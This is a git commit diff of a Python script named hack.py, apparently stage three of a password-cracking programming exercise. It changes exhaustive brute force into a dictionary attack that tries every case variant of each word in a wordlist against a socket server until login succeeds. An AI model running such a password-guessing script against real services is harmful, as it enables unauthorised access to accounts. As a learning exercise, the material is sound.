2e125c1f766ed9ec1cd4331060c37d20f1869692
Yerdaulet <47812867+syzygy17@users.noreply.github.com>
2021-01-13 09:48:34 +0600

    Stage 3/5
    Completed the third stage

--- hack.py
+++ hack.py
@@ -3,24 +3,31 @@ import sys
 import itertools
 
 
+def yield_variants(file):
+    with open(file, 'r') as pw_list:
+        for pw in pw_list:
+            for variation in \
+                    map(''.join, itertools.product(*(sorted({c.upper(), c.lower()}) for c in pw.strip('\n')))):
+                yield variation
+
+
 args = sys.argv
 ip = str(args[1])
 port = int(args[2])
 buffer_size = 1024
-char_set = 'abcdefghijklmnopqrstuvwxyz0123456789'
 CONNECTION_SUCCESS = 'Connection success!'
 
 my_socket = socket.socket()
 address = (ip, port)
 my_socket.connect(address)
-for i in range(1, 1_000_000):
-    options = itertools.product(char_set, repeat=i)
-    for option in options:
-        password = ''.join(option)
+passwords = yield_variants('passwords.txt')
+while True:
+    try:
+        password = next(passwords)
         my_socket.send(password.encode())
         response = my_socket.recv(buffer_size)
         if response.decode() == CONNECTION_SUCCESS:
             print(password)
             quit()
-
-my_socket.close()
+    except StopIteration:
+        print('StopIteration')
